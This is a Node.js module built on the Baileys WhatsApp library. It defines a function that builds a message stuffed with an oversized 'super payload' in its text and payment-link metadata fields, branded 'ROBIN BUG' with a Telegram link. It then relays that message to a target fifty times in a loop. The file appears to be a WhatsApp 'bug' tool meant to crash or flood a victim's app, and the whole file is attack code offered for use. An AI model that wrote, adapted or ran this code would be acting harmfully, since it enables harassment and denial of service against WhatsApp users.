
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');

async function xbetainvis(SYxS7, target) {
    const superSpam = getSuperPayload(50000);
    
    const msg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: superSpam,
            matchedText: "https://t.me/kashmiri1_1",
            paymentLinkMetadata: {
                button: { displayText: "ROBIN BUG" },
                header: { headerType: 1 },
                provider: { paramsJson: superSpam }
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "ROBIN BUG" },
                    header: { headerType: 1 },
                    provider: { paramsJson: superSpam }
                }
            }
        }
    }, {
        additionalAttributes: { edit: "7" }
    });

    for (let i = 0; i < 50; i++) {
        try {
            await SYxS7.relayMessage(target, {
                groupStatusMessageV2: {
                    message: msg.message
                }
            }, { 
                messageId: null 
            });
            await new Promise(resolve => setTimeout(resolve, 500));
        } catch (error) {
            console.log(`[ 🗑️ ] Error: ${error.message}`);
        }
    }
}

module.exports = { xbetainvis };
